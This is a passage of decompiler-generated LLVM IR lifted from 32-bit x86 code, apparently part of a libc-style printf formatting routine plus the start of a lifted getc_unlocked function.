  %v4_8055b41 = and i8 %v3_8055b41, 16
  %v5_8055b41 = icmp eq i8 %v4_8055b41, 0
  %v1_8055b45 = icmp eq i1 %v5_8055b41, false
  br i1 %v1_8055b45, label %dec_label_pc_8055b56, label %dec_label_pc_8055b47

dec_label_pc_8055b47:                             ; preds = %dec_label_pc_8055b3a
  %v1_8055b47 = icmp eq i32 %v0_8055b47, 0
  %v1_8055b49 = icmp eq i1 %v1_8055b47, false
  br i1 %v1_8055b49, label %dec_label_pc_8055b56, label %dec_label_pc_8055b4b

dec_label_pc_8055b4b:                             ; preds = %dec_label_pc_8055b47
  br i1 %v12_80559af, label %dec_label_pc_8055b6d, label %dec_label_pc_8055b52

dec_label_pc_8055b52:                             ; preds = %dec_label_pc_8055b4b
  %v0_8055b52 = load i32, i32* %ebp.global-to-local, align 4
  %tmp189 = icmp slt i32 %v0_8055b52, 1
  br i1 %tmp189, label %dec_label_pc_8055b6d, label %dec_label_pc_8055b56

dec_label_pc_8055b56:                             ; preds = %dec_label_pc_8055b52, %dec_label_pc_8055b47, %dec_label_pc_8055b3a
  %v1_8055b56 = inttoptr i32 %v0_8055b56 to i32*
  store i32 112, i32* %v1_8055b56, align 4
  %v0_8055b5c = load i32, i32* @ecx, align 4
  %v1_8055b5c = add i32 %v0_8055b5c, 4
  %v2_8055b5c = inttoptr i32 %v1_8055b5c to i32*
  store i32 1, i32* %v2_8055b5c, align 4
  %v0_8055b63 = load i32, i32* @ecx, align 4
  %v1_8055b63 = add i32 %v0_8055b63, 8
  %v2_8055b63 = inttoptr i32 %v1_8055b63 to i32*
  store i32 ptrtoint (i32* @global_var_805aea0.549 to i32), i32* %v2_8055b63, align 4
  %v0_8055b6a = load i32, i32* @ecx, align 4
  %v1_8055b6a = add i32 %v0_8055b6a, 12
  store i32 %v1_8055b6a, i32* @ecx, align 4
  %v0_8055b6d.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055b6d

dec_label_pc_8055b6d:                             ; preds = %dec_label_pc_8055b52, %dec_label_pc_8055b4b, %dec_label_pc_8055b56
  %v0_8055b74 = phi i32 [ %v0_8055b56, %dec_label_pc_8055b52 ], [ %v0_8055b56, %dec_label_pc_8055b4b ], [ %v1_8055b6a, %dec_label_pc_8055b56 ]
  %v0_8055b6d = phi i32 [ %v0_8055b6d111, %dec_label_pc_8055b52 ], [ %v0_8055b6d111, %dec_label_pc_8055b4b ], [ %v0_8055b6d.pre, %dec_label_pc_8055b56 ]
  %v1_8055b6d = add i32 %v0_8055b6d, 1
  %v8_8055b6d = icmp eq i32 %v1_8055b6d, 0
  store i32 %v1_8055b6d, i32* %ebx.global-to-local, align 4
  br i1 %v8_8055b6d, label %dec_label_pc_8055b87, label %dec_label_pc_8055b70

dec_label_pc_8055b70:                             ; preds = %dec_label_pc_8055b6d
  %v1_8055b72 = sub i32 -1, %v0_8055b6d
  store i32 %v1_8055b72, i32* %eax.global-to-local, align 4
  %v1_8055b74 = inttoptr i32 %v0_8055b74 to i32*
  store i32 176, i32* %v1_8055b74, align 4
  %v0_8055b7a = load i32, i32* %eax.global-to-local, align 4
  %v1_8055b7a = load i32, i32* @ecx, align 4
  %v2_8055b7a = add i32 %v1_8055b7a, 4
  %v3_8055b7a = inttoptr i32 %v2_8055b7a to i32*
  store i32 %v0_8055b7a, i32* %v3_8055b7a, align 4
  %v0_8055b7d = load i32, i32* @ecx, align 4
  %v1_8055b7d = add i32 %v0_8055b7d, 8
  %v2_8055b7d = inttoptr i32 %v1_8055b7d to i32*
  store i32 ptrtoint (i32* @global_var_805ae93.548 to i32), i32* %v2_8055b7d, align 4
  %v0_8055b84 = load i32, i32* @ecx, align 4
  %v1_8055b84 = add i32 %v0_8055b84, 12
  store i32 %v1_8055b84, i32* @ecx, align 4
  br label %dec_label_pc_8055b87

dec_label_pc_8055b87:                             ; preds = %dec_label_pc_8055b6d, %dec_label_pc_8055b70
  %v0_8055b8b = phi i32 [ %v0_8055b74, %dec_label_pc_8055b6d ], [ %v1_8055b84, %dec_label_pc_8055b70 ]
  %v0_8055b87 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055b87 = icmp eq i32 %v0_8055b87, 0
  br i1 %v1_8055b87, label %dec_label_pc_8055b9a, label %dec_label_pc_8055b8b

dec_label_pc_8055b8b:                             ; preds = %dec_label_pc_8055b87
  %v1_8055b8b = inttoptr i32 %v0_8055b8b to i32*
  store i32 112, i32* %v1_8055b8b, align 4
  %v0_8055b91 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055b91 = load i32, i32* @ecx, align 4
  %v2_8055b91 = add i32 %v1_8055b91, 4
  %v3_8055b91 = inttoptr i32 %v2_8055b91 to i32*
  store i32 %v0_8055b91, i32* %v3_8055b91, align 4
  %v0_8055b94 = load i32, i32* %edi.global-to-local, align 4
  %v1_8055b94 = load i32, i32* @ecx, align 4
  %v2_8055b94 = add i32 %v1_8055b94, 8
  %v3_8055b94 = inttoptr i32 %v2_8055b94 to i32*
  store i32 %v0_8055b94, i32* %v3_8055b94, align 4
  %v0_8055b97 = load i32, i32* @ecx, align 4
  %v1_8055b97 = add i32 %v0_8055b97, 12
  store i32 %v1_8055b97, i32* @ecx, align 4
  br label %dec_label_pc_8055b9a

dec_label_pc_8055b9a:                             ; preds = %dec_label_pc_8055b87, %dec_label_pc_8055b8b
  %v0_8055bb8 = phi i32 [ %v0_8055b8b, %dec_label_pc_8055b87 ], [ %v1_8055b97, %dec_label_pc_8055b8b ]
  br i1 %v1_80559b4, label %dec_label_pc_8055bae, label %dec_label_pc_8055ba1

dec_label_pc_8055ba1:                             ; preds = %dec_label_pc_8055b9a
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  %v3_8055ba8 = load i8, i8* %v2_8055b41, align 1
  %v4_8055ba8 = and i8 %v3_8055ba8, 16
  %v5_8055ba8 = icmp eq i8 %v4_8055ba8, 0
  br i1 %v5_8055ba8, label %dec_label_pc_8055bcb, label %dec_label_pc_8055bae

dec_label_pc_8055bae:                             ; preds = %dec_label_pc_8055ba1, %dec_label_pc_8055b9a
  %v0_8055bae = load i32, i32* %edx.global-to-local, align 4
  %v1_8055bb0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055bb0 = sub i32 %v0_8055bae, %v1_8055bb0
  store i32 %v2_8055bb0, i32* %eax.global-to-local, align 4
  %v1_8055bb2 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8055bb2 = sub i32 %v2_8055bb0, %v1_8055bb2
  %v8_8055bb2 = xor i32 %v1_8055bb2, %v2_8055bb0
  %v9_8055bb2 = xor i32 %v2_8055bb2, %v2_8055bb0
  %v10_8055bb2 = and i32 %v9_8055bb2, %v8_8055bb2
  %v11_8055bb2 = icmp slt i32 %v10_8055bb2, 0
  %v13_8055bb2 = icmp slt i32 %v2_8055bb2, 0
  %v2_8055bb4 = icmp eq i1 %v13_8055bb2, %v11_8055bb2
  br i1 %v2_8055bb4, label %dec_label_pc_8055bcb, label %dec_label_pc_8055bb6

dec_label_pc_8055bb6:                             ; preds = %dec_label_pc_8055bae
  %v2_8055bb6 = sub i32 %v1_8055bb2, %v2_8055bb0
  store i32 %v2_8055bb6, i32* %ebp.global-to-local, align 4
  %v1_8055bb8 = inttoptr i32 %v0_8055bb8 to i32*
  store i32 176, i32* %v1_8055bb8, align 4
  %v0_8055bbe = load i32, i32* %ebp.global-to-local, align 4
  %v1_8055bbe = load i32, i32* @ecx, align 4
  %v2_8055bbe = add i32 %v1_8055bbe, 4
  %v3_8055bbe = inttoptr i32 %v2_8055bbe to i32*
  store i32 %v0_8055bbe, i32* %v3_8055bbe, align 4
  %v0_8055bc1 = load i32, i32* @ecx, align 4
  %v1_8055bc1 = add i32 %v0_8055bc1, 8
  %v2_8055bc1 = inttoptr i32 %v1_8055bc1 to i32*
  store i32 ptrtoint (i32* @global_var_805ae93.548 to i32), i32* %v2_8055bc1, align 4
  %v0_8055bc8 = load i32, i32* @ecx, align 4
  %v1_8055bc8 = add i32 %v0_8055bc8, 12
  store i32 %v1_8055bc8, i32* @ecx, align 4
  br label %dec_label_pc_8055bcb

dec_label_pc_8055bcb:                             ; preds = %dec_label_pc_8055bae, %dec_label_pc_8055ba1, %dec_label_pc_8055bb6
  %v1_8055c53121 = phi i32 [ %v0_8055bb8, %dec_label_pc_8055bae ], [ %v0_8055bb8, %dec_label_pc_8055ba1 ], [ %v1_8055bc8, %dec_label_pc_8055bb6 ]
  %v12_8055bcb = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_8055bcb, label %dec_label_pc_8055c46, label %dec_label_pc_8055bd2

dec_label_pc_8055bd2:                             ; preds = %dec_label_pc_8055bcb
  %v5_8055bd2 = load i32, i32* %edx.global-to-local, align 4
  %v6_8055bd2 = and i32 %v5_8055bd2, -256
  %v7_8055bd2 = or i32 %v6_8055bd2, %stack_var_-42.0
  store i32 %v7_8055bd2, i32* %edx.global-to-local, align 4
  %v0_8055bd9 = load i32, i32* %esi.global-to-local, align 4
  %v2_8055bd9 = icmp slt i32 %v0_8055bd9, 0
  %v1_8055bdb = trunc i32 %stack_var_-42.0 to i8
  br i1 %v2_8055bd9, label %dec_label_pc_8055bea, label %dec_label_pc_8055bf3

dec_label_pc_8055bea:                             ; preds = %dec_label_pc_8055bd2
  store i32 %v0_8055bd9, i32* %edx.global-to-local, align 4
  %v1_8055bec = sub i32 0, %v0_8055bd9
  br label %dec_label_pc_8055bf3

dec_label_pc_8055bf3:                             ; preds = %dec_label_pc_8055bd2, %dec_label_pc_8055bea
  %storemerge27 = phi i32 [ %v1_8055bec, %dec_label_pc_8055bea ], [ %v0_8055bd9, %dec_label_pc_8055bd2 ]
  %storemerge9 = phi i8 [ 45, %dec_label_pc_8055bea ], [ 43, %dec_label_pc_8055bd2 ]
  store i32 %storemerge27, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-27, align 4
  %v2_8055bfb = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_8055bfb, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8055c07

dec_label_pc_8055c07:                             ; preds = %dec_label_pc_8055c07.backedge, %dec_label_pc_8055bf3
  %v0_8055c12 = phi i32 [ %v0_8055c12.pre, %dec_label_pc_8055c07.backedge ], [ %v2_8055bfb, %dec_label_pc_8055bf3 ]
  %v0_8055c0f = phi i32 [ %v0_8055c0f.pre, %dec_label_pc_8055c07.backedge ], [ 2, %dec_label_pc_8055bf3 ]
  %v0_8055c07 = phi i32 [ %v9_8055c10, %dec_label_pc_8055c07.backedge ], [ %storemerge27, %dec_label_pc_8055bf3 ]
  %v1_8055c0e = ashr i32 %v0_8055c07, 31
  %v1_8055c0f = add i32 %v0_8055c0f, 1
  store i32 %v1_8055c0f, i32* %edi.global-to-local, align 4
  %v2_8055c10 = zext i32 %v0_8055c07 to i64
  %v4_8055c10 = zext i32 %v1_8055c0e to i64
  %v5_8055c10 = mul nuw i64 %v4_8055c10, 4294967296
  %v6_8055c10 = or i64 %v5_8055c10, %v2_8055c10
  %v8_8055c10 = sdiv i64 %v6_8055c10, 10
  %v9_8055c10 = trunc i64 %v8_8055c10 to i32
  %v10_8055c10 = srem i64 %v6_8055c10, 10
  %v1_8055c12 = add i32 %v0_8055c12, -1
  store i32 %v1_8055c12, i32* %ebx.global-to-local, align 4
  store i32 %v9_8055c10, i32* %esi.global-to-local, align 4
  %v3_8055c15 = and i32 %v9_8055c10, -256
  %v1_8055c17 = trunc i64 %v10_8055c10 to i8
  %v2_8055c17 = add i8 %v1_8055c17, 48
  %v12_8055c17 = zext i8 %v2_8055c17 to i32
  %v15_8055c17 = or i32 %v12_8055c17, %v3_8055c15
  store i32 %v15_8055c17, i32* %eax.global-to-local, align 4
  %v3_8055c1c = inttoptr i32 %v1_8055c12 to i8*
  store i8 %v2_8055c17, i8* %v3_8055c1c, align 1
  store i32 %v9_8055c10, i32* %edx.global-to-local, align 4
  %v7_8055c20 = icmp sgt i32 %v1_8055c0f, 3
  br i1 %v7_8055c20, label %dec_label_pc_8055c22, label %dec_label_pc_8055c07.backedge

dec_label_pc_8055c22:                             ; preds = %dec_label_pc_8055c07
  %v2_8055c22 = icmp eq i32 %v9_8055c10, 0
  %v1_8055c24 = icmp eq i1 %v2_8055c22, false
  br i1 %v1_8055c24, label %dec_label_pc_8055c07.backedge, label %dec_label_pc_8055c26

dec_label_pc_8055c07.backedge:                    ; preds = %dec_label_pc_8055c22, %dec_label_pc_8055c07
  %v0_8055c0f.pre = load i32, i32* %edi.global-to-local, align 4
  %v0_8055c12.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055c07

dec_label_pc_8055c26:                             ; preds = %dec_label_pc_8055c22
  %v4_8055c26 = zext i8 %storemerge9 to i32
  %v7_8055c26 = or i32 %v3_8055c15, %v4_8055c26
  store i32 %v7_8055c26, i32* %edx.global-to-local, align 4
  %v0_8055c2a = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055c2a = add i32 %v0_8055c2a, -2
  store i32 %v1_8055c2a, i32* %eax.global-to-local, align 4
  %v3_8055c2d = add i32 %v0_8055c2a, -1
  %v4_8055c2d = inttoptr i32 %v3_8055c2d to i8*
  store i8 %storemerge9, i8* %v4_8055c2d, align 1
  %v5_8055c30 = load i32, i32* %edx.global-to-local, align 4
  %v6_8055c30 = and i32 %v5_8055c30, -256
  %v7_8055c30 = or i32 %v6_8055c30, %stack_var_-42.0
  store i32 %v7_8055c30, i32* %edx.global-to-local, align 4
  %v2_8055c34 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8055c34 = add i32 %v2_8055c34, -2
  %v4_8055c34 = inttoptr i32 %v3_8055c34 to i8*
  store i8 %v1_8055bdb, i8* %v4_8055c34, align 1
  %v0_8055c37 = load i32, i32* @ecx, align 4
  %v1_8055c37 = inttoptr i32 %v0_8055c37 to i32*
  store i32 112, i32* %v1_8055c37, align 4
  %v0_8055c3d = load i32, i32* %edi.global-to-local, align 4
  %v1_8055c3d = load i32, i32* @ecx, align 4
  %v2_8055c3d = add i32 %v1_8055c3d, 4
  %v3_8055c3d = inttoptr i32 %v2_8055c3d to i32*
  store i32 %v0_8055c3d, i32* %v3_8055c3d, align 4
  %v0_8055c40 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055c40 = load i32, i32* @ecx, align 4
  %v2_8055c40 = add i32 %v1_8055c40, 8
  %v3_8055c40 = inttoptr i32 %v2_8055c40 to i32*
  store i32 %v0_8055c40, i32* %v3_8055c40, align 4
  %v0_8055c43 = load i32, i32* @ecx, align 4
  %v1_8055c43 = add i32 %v0_8055c43, 12
  store i32 %v1_8055c43, i32* @ecx, align 4
  br label %dec_label_pc_8055c46

dec_label_pc_8055c46:                             ; preds = %dec_label_pc_8055bcb, %dec_label_pc_8055875, %dec_label_pc_8055c26
  %v0_8055cc5 = phi i32 [ %v1_8055c53121, %dec_label_pc_8055bcb ], [ %v2_805587d, %dec_label_pc_8055875 ], [ %v1_8055c43, %dec_label_pc_8055c26 ]
  %v2_8055c46 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8055c46, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055c4a

dec_label_pc_8055c4a:                             ; preds = %dec_label_pc_8055c4a, %dec_label_pc_8055c46
  %v0_8055c4a = phi i32 [ %v2_8055c46, %dec_label_pc_8055c46 ], [ %v1_8055c4c, %dec_label_pc_8055c4a ]
  %stack_var_-216.0 = phi i32 [ %v3_8055777, %dec_label_pc_8055c46 ], [ %v5_8055c4f, %dec_label_pc_8055c4a ]
  %v1_8055c4a = inttoptr i32 %v0_8055c4a to i32*
  %v2_8055c4a = load i32, i32* %v1_8055c4a, align 4
  store i32 %v2_8055c4a, i32* %ebx.global-to-local, align 4
  %v1_8055c4c = add i32 %v0_8055c4a, 12
  store i32 %v1_8055c4c, i32* %eax.global-to-local, align 4
  %v5_8055c4f = sub i32 %stack_var_-216.0, %v2_8055c4a
  %v7_8055c53 = icmp ult i32 %v1_8055c4c, %v0_8055cc5
  br i1 %v7_8055c53, label %dec_label_pc_8055c4a, label %dec_label_pc_8055c57

dec_label_pc_8055c57:                             ; preds = %dec_label_pc_8055c4a
  store i32 %v0_8055cc5, i32* %esi.global-to-local, align 4
  %v5_8055c6a = icmp eq i8 %stack_var_-26.0, 0
  store i32 160, i32* %stack_var_-168, align 4
  %v1_8055c7a = icmp eq i1 %v5_8055c6a, false
  %v2_8055c7a = zext i1 %v1_8055c7a to i32
  store i32 %v2_8055c7a, i32* %edx.global-to-local, align 4
  %v2_8055c7d = sub i32 %v5_8055c4f, %v2_8055c7a
  store i32 %v2_8055c7d, i32* %eax.global-to-local, align 4
  %tmp190 = icmp slt i32 %v2_8055c7d, 1
  br i1 %tmp190, label %dec_label_pc_8055cc7, label %dec_label_pc_8055c87

dec_label_pc_8055c87:                             ; preds = %dec_label_pc_8055c57
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v2_8055c8e = inttoptr i32 %v1_80557b7 to i8*
  %v3_8055c8e = load i8, i8* %v2_8055c8e, align 1
  %v4_8055c8e = and i8 %v3_8055c8e, 8
  %v5_8055c8e = icmp eq i8 %v4_8055c8e, 0
  br i1 %v5_8055c8e, label %dec_label_pc_8055ca9, label %dec_label_pc_8055c94

dec_label_pc_8055c94:                             ; preds = %dec_label_pc_8055c87
  %v1_8055c94 = add i32 %v0_8055cc5, 12
  store i32 %v1_8055c94, i32* %esi.global-to-local, align 4
  %v1_8055c97 = inttoptr i32 %v0_8055cc5 to i32*
  store i32 160, i32* %v1_8055c97, align 4
  %v1_8055c9d = load i32, i32* @ecx, align 4
  %v2_8055c9d = add i32 %v1_8055c9d, 4
  %v3_8055c9d = inttoptr i32 %v2_8055c9d to i32*
  store i32 %v2_8055c7d, i32* %v3_8055c9d, align 4
  %v0_8055ca0 = load i32, i32* @ecx, align 4
  %v1_8055ca0 = add i32 %v0_8055ca0, 8
  %v2_8055ca0 = inttoptr i32 %v1_8055ca0 to i32*
  store i32 ptrtoint (i32* @global_var_805ae93.548 to i32), i32* %v2_8055ca0, align 4
  br label %dec_label_pc_8055cc7

dec_label_pc_8055ca9:                             ; preds = %dec_label_pc_8055c87
  store i32 %tmp156, i32* %ebx.global-to-local, align 4
  %v1_8055cb0 = add i32 %tmp156, 16
  %v2_8055cb0 = inttoptr i32 %v1_8055cb0 to i32*
  %v3_8055cb0 = load i32, i32* %v2_8055cb0, align 4
  %v9_8055cb0 = icmp eq i32 %v3_8055cb0, 48
  %v1_8055cb4 = icmp eq i1 %v9_8055cb0, false
  br i1 %v1_8055cb4, label %dec_label_pc_8055cc1, label %dec_label_pc_8055cb6

dec_label_pc_8055cb6:                             ; preds = %dec_label_pc_8055ca9
  %v3_8055cb6 = load i32, i32* %stack_var_-152, align 4
  %v5_8055cb6 = add i32 %v3_8055cb6, %v2_8055c7d
  store i32 %v5_8055cb6, i32* %stack_var_-152, align 4
  br label %dec_label_pc_8055cc5

dec_label_pc_8055cbc:                             ; preds = %dec_label_pc_8055ccd
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8055cf4

dec_label_pc_8055cc1:                             ; preds = %dec_label_pc_8055ca9
  br label %dec_label_pc_8055cc5

dec_label_pc_8055cc5:                             ; preds = %dec_label_pc_8055cb6, %dec_label_pc_8055cc1
  store i32 %v0_8055cc5, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8055cc7

dec_label_pc_8055cc7:                             ; preds = %dec_label_pc_8055c57, %dec_label_pc_8055c94, %dec_label_pc_8055cc5
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_8055cc9 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_8055cc9, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055ccd

dec_label_pc_8055ccd:                             ; preds = %dec_label_pc_8055ceb, %dec_label_pc_8055cc7
  call void @__pseudo_call(i32 %tmp156)
  %v1_8055ce6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055ce6 = add i32 %v1_8055ce6, 4
  %v3_8055ce6 = inttoptr i32 %v2_8055ce6 to i32*
  %v4_8055ce6 = load i32, i32* %v3_8055ce6, align 4
  %v15_8055ce6 = icmp eq i32 %v2_8055c7d, %v4_8055ce6
  %v1_8055ce9 = icmp eq i1 %v15_8055ce6, false
  br i1 %v1_8055ce9, label %dec_label_pc_8055cbc, label %dec_label_pc_8055ceb

dec_label_pc_8055ceb:                             ; preds = %dec_label_pc_8055ccd
  %v1_8055ceb = add i32 %v1_8055ce6, 12
  store i32 %v1_8055ceb, i32* %ebx.global-to-local, align 4
  %v0_8055cee = load i32, i32* %edi.global-to-local, align 4
  %v2_8055cee = add i32 %v0_8055cee, %v2_8055c7d
  store i32 %v2_8055cee, i32* %edi.global-to-local, align 4
  %v1_8055cf0 = load i32, i32* %esi.global-to-local, align 4
  %v7_8055cf0 = icmp ult i32 %v1_8055ceb, %v1_8055cf0
  br i1 %v7_8055cf0, label %dec_label_pc_8055ccd, label %dec_label_pc_8055cf4

dec_label_pc_8055cf4:                             ; preds = %dec_label_pc_8055ceb, %dec_label_pc_8055cbc
  %v0_8055cfa = phi i32 [ -1, %dec_label_pc_8055cbc ], [ %v2_8055cee, %dec_label_pc_8055ceb ]
  store i32 %v0_8055cfa, i32* %eax.global-to-local, align 4
  %v2_8055cfd = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8055cfd, i32* @esi, align 4
  store i32 %v0_805575a, i32* @edi, align 4
  store i32 %v0_8055759, i32* @ebp, align 4
  ret i32 %v0_8055cfa

; uselistorder directives
  uselistorder i32 %v0_8055cfa, { 1, 0 }
  uselistorder i32 %v2_8055c7d, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v2_8055c7a, { 1, 0 }
  uselistorder i32 %v1_8055c4c, { 1, 2, 0 }
  uselistorder i32 %v0_8055c4a, { 1, 0 }
  uselistorder i32 %v0_8055cc5, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v9_8055c10, { 3, 2, 1, 0, 4 }
  uselistorder i8 %storemerge9, { 1, 0 }
  uselistorder i32 %v0_8055bd9, { 2, 1, 0, 3 }
  uselistorder i32 %v2_8055bb2, { 1, 0 }
  uselistorder i32 %v1_8055bb2, { 1, 0, 2 }
  uselistorder i32 %v2_8055bb0, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_8055b6d, { 1, 0 }
  uselistorder i32 %v2_8055ada, { 2, 1, 3, 0 }
  uselistorder i32 %v2_8055ad4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_8055b31, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v1_8055a70, { 1, 0 }
  uselistorder i32 %v0_8055a6b, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8055a38, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_8055a33, { 1, 0 }
  uselistorder i8 %v2_8055a2c, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_8055a2c, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-220.3, { 1, 0 }
  uselistorder i32 %v0_80559b6, { 1, 2, 0 }
  uselistorder i32 %stack_var_-42.0, { 0, 2, 1 }
  uselistorder i8 %stack_var_-207.1, { 4, 3, 1, 5, 0, 2 }
  uselistorder i8 %v4_805599b, { 1, 0 }
  uselistorder i32 %tmp195, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_8055966, { 1, 0 }
  uselistorder i32 %v2_805591f, { 2, 1, 0 }
  uselistorder i32 %v0_80559d5, { 1, 2, 0, 3 }
  uselistorder x86_fp80 %v1_80558f1, { 1, 0 }
  uselistorder x86_fp80 %v3_80558d3, { 2, 0, 1, 3, 6, 7, 5, 8, 4, 9, 10 }
  uselistorder i32 %v3_80558d0, { 1, 0 }
  uselistorder x86_fp80 %v4_80558b8, { 2, 0, 1, 3, 4 }
  uselistorder x86_fp80 %v3_80558b2, { 1, 2, 0 }
  uselistorder i32 %v3_80558af, { 1, 0 }
  uselistorder i32 %v1_80558a8, { 3, 0, 1, 2 }
  uselistorder i32 %stack_var_-220.0, { 2, 0, 1 }
  uselistorder x86_fp80 %v1_80558e1, { 8, 1, 2, 5, 3, 4, 6, 0, 7, 9 }
  uselistorder x86_fp80 %v2_80558a9, { 1, 0 }
  uselistorder i8 %v4_8055859, { 1, 0 }
  uselistorder i3 %v1_80557f6, { 1, 0, 2 }
  uselistorder i8 %stack_var_-207.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i8 %v3_805577e, { 1, 0, 2, 3 }
  uselistorder i32 %v3_8055777, { 1, 0, 2 }
  uselistorder i3 %v4_8055770, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp156, { 14, 13, 12, 11, 10, 9, 8, 7, 0, 6, 1, 2, 3, 5, 4 }
  uselistorder x86_fp80 %tmp155, { 3, 2, 1, 0, 4, 5 }
  uselistorder x86_fp80* %st1.global-to-local, { 2, 3, 4, 12, 7, 1, 5, 6, 0, 11, 9, 10, 8 }
  uselistorder x86_fp80* %st0.global-to-local, { 1, 7, 8, 5, 2, 3, 6, 4, 0 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 4, 5, 6, 7, 8, 1, 9, 10, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 2, 0, 1, 3, 4, 6, 8, 7, 5, 9, 10, 11, 12 }
  uselistorder i32* %edx.global-to-local, { 1, 2, 3, 4, 5, 6, 28, 7, 8, 11, 13, 12, 14, 9, 10, 15, 18, 16, 19, 17, 20, 21, 22, 23, 24, 0, 25, 26, 27 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 5, 4, 6, 7, 9, 8, 10 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 6, 7, 5, 8, 9, 10, 11, 26, 12, 13, 27, 14, 15, 16, 17, 21, 22, 18, 19, 20, 23, 24, 25, 28, 29 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 4, 5, 2, 6, 8, 3, 7, 9, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 2, 3, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i8 43, { 2, 1, 0 }
  uselistorder i8 45, { 2, 3, 1, 0, 4 }
  uselistorder i32 165, { 1, 0 }
  uselistorder i32 21, { 1, 2, 0 }
  uselistorder i8 102, { 2, 3, 1, 0 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder i32 69, { 1, 2, 0 }
  uselistorder x86_fp80 0xK401CEE6B280000000000, { 1, 2, 0 }
  uselistorder i32 4096, { 4, 21, 5, 23, 6, 22, 10, 19, 20, 7, 8, 11, 13, 12, 1, 14, 16, 15, 2, 18, 17, 3, 0, 9 }
  uselistorder i32 13, { 1, 6, 5, 2, 3, 4, 0 }
  uselistorder x86_fp80 0xK3FFD8000000000000000, { 1, 0, 2, 3 }
  uselistorder x86_fp80 0xK00000000000000000000, { 0, 2, 3, 4, 1 }
  uselistorder i8 6, { 1, 0 }
  uselistorder label %dec_label_pc_8055cc7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055cc5, { 1, 0 }
  uselistorder label %dec_label_pc_8055c46, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055bf3, { 1, 0 }
  uselistorder label %dec_label_pc_8055bcb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055b9a, { 1, 0 }
  uselistorder label %dec_label_pc_8055b87, { 1, 0 }
  uselistorder label %dec_label_pc_8055b6d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055b3a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055b25, { 1, 0 }
  uselistorder label %dec_label_pc_8055b1a, { 1, 0 }
  uselistorder label %dec_label_pc_8055aa1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055a93, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055a59, { 1, 0 }
  uselistorder label %dec_label_pc_8055a29.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_80559f5, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80559c4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80559af, { 1, 0 }
  uselistorder label %dec_label_pc_805591b, { 1, 0 }
  uselistorder label %dec_label_pc_80558f3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80558f1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80558e1, { 1, 0 }
  uselistorder label %dec_label_pc_8055875, { 1, 0 }
  uselistorder label %dec_label_pc_805579e, { 1, 0 }
}

define i32 @getc_unlocked() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_6()
  %stack_var_-5 = alloca i8, align 1
  %v0_8055d04 = load i32, i32* @ebx, align 4
  %v4_8055d08 = ptrtoint i16* %tmp to i32
  store i32 %v4_8055d08, i32* @ebx, align 4
  %v1_8055d0c = add i32 %v4_8055d08, 16
  %v2_8055d0c = inttoptr i32 %v1_8055d0c to i32*
  %v3_8055d0c = load i32, i32* %v2_8055d0c, align 4
